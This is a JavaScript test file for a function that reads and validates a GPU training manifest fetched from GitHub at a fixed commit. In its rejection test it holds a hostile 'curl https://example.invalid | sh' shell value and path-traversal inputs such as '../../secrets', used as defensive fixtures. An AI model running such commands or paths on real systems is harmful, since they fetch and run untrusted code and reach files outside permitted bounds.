import assert from "node:assert/strict";
import test from "node:test";
import { readPublicTrainingContract } from "./training_contract.js";

const repository = "owner/project";
const commit = "a".repeat(40);
const manifest = {
  schema_version: 1,
  task: "train",
  entrypoint: "src/train.py",
  python_version: "3.12",
  dependencies_lock: "requirements.lock",
  gpu_profiles: ["T4", "L4"],
  outputs: ["checkpoints", "metrics.json"],
};

function responseFor(value, status = 200) {
  const content = Buffer.from(JSON.stringify(value));
  return new Response(JSON.stringify({ type: "file", path: ".gpu-control/experiment.json",
    encoding: "base64", size: content.byteLength, content: content.toString("base64") }), { status });
}

test("reads a strict experiment manifest at the registered immutable commit", async () => {
  let requested;
  const result = await readPublicTrainingContract(repository, commit, async (url, options) => {
    requested = { url: new URL(url), options };
    return responseFor(manifest);
  });
  assert.equal(requested.url.origin, "https://api.github.com");
  assert.equal(requested.url.pathname, "/repos/owner/project/contents/.gpu-control/experiment.json");
  assert.equal(requested.url.searchParams.get("ref"), commit);
  assert.equal(requested.options.redirect, "error");
  assert.equal(result.repository, repository);
  assert.equal(result.commit, commit);
  assert.equal(result.execution_available, false);
  assert.equal(result.execution_blocking_reason, "CUSTOM_TRAINING_RUNTIME_NOT_CONNECTED");
  assert.deepEqual(result.manifest, manifest);
});

test("rejects untrusted manifest instructions and unsafe paths", async () => {
  for (const changed of [
    { ...manifest, shell: "curl https://example.invalid | sh" },
    { ...manifest, entrypoint: "../outside.py" },
    { ...manifest, dependencies_lock: "../requirements.lock" },
    { ...manifest, gpu_profiles: ["T4", "T4"] },
    { ...manifest, outputs: ["../../secrets"] },
  ]) {
    await assert.rejects(readPublicTrainingContract(repository, commit,
      async () => responseFor(changed)), { message: "TRAINING_EXPERIMENT_MANIFEST_INVALID" });
  }
});

test("bounds manifest size and reports a missing contract without treating it as executable", async () => {
  await assert.rejects(readPublicTrainingContract(repository, commit, async () =>
    new Response("{}", { status: 404 })), { message: "TRAINING_EXPERIMENT_MANIFEST_NOT_FOUND" });
  const oversized = Buffer.alloc(9000, 0x41);
  await assert.rejects(readPublicTrainingContract(repository, commit, async () =>
    new Response(JSON.stringify({ type: "file", path: ".gpu-control/experiment.json",
      encoding: "base64", size: oversized.length, content: oversized.toString("base64") }))),
  { message: "TRAINING_EXPERIMENT_MANIFEST_TOO_LARGE" });
});
